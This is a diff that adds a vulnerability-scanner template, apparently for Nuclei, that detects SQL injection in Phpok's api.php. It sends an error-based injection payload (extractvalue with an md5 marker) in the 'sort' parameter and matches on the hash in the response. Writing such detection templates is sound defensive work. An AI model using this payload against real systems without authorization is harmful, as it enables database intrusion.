@@ -1,0 +1,19 @@
+id: phpok-sqli
+info:
+  name: Phpok SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in Phpok's API.
+variables:
+  r1: '{{rand_int(10000, 21000)}}'
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}})))"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, md5(r1))
